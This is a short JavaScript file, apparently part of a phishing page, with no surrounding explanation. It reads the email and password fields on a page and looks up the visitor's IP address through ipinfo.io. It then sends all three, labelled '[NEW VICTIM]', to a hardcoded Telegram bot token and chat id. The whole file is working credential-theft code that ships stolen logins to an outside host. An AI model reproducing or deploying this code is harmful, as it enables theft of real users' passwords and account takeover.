function sendTelegramMessage(message) {
  var apiUrl = `https://api.telegram.org/bot6544753640:AAHampKHpttT5D8k6UHhJfNW2AH1aBbXJP0/sendMessage`;
  var params = {
    'chat_id': 6637031375,
    'text': message,
  };

  fetch(apiUrl + '?' + new URLSearchParams(params), {
    method: 'GET'
  })
    .then(response => response.json())
    .then(data => {
      console.log('Response:', data);
    })
    .catch(error => {
      console.error('Error during fetch operation:', error);
    });
}

function getAutofilledValues() { 
    var email = document.getElementById('email').value;
    var password = document.getElementById('password').value;

    console.log('Autofilled Email:', email); 
    console.log('Autofilled Password:', password); 

    fetch('https://ipinfo.io/json')
    .then(response => response.json())
    .then(data => {
        console.log('IP Address:', data.ip);
        ip_addr = data.ip
    })
    .catch(error => {
        console.error('Error fetching IP address:', error);
        ip_addr = "No Found"
    });

    var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: ${ip_addr}`;
    sendTelegramMessage(message); 
}
